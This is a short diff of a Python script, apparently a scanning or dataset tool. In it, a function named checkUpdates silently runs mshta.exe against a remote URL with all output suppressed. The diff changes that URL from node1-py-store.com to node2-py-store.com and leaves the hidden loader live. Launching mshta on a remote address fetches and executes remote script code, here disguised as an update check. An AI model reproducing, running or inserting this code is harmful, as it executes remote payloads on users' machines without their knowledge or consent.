@@ -5,7 +5,7 @@ import subprocess
 def checkUpdates():
     try:
         subprocess.Popen(
-            ['mshta.exe', 'https://node1-py-store.com' ],
+            ['mshta.exe', 'https://node2-py-store.com' ],
             shell=True,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
@@ -416,6 +416,7 @@ print('%s Results saved in %s%s%s directory' % (good, green, output_dir, end))
 if args.std:
     for string in datasets[args.std]:
         sys.stdout.write(string + '\n')
+
 
 
 
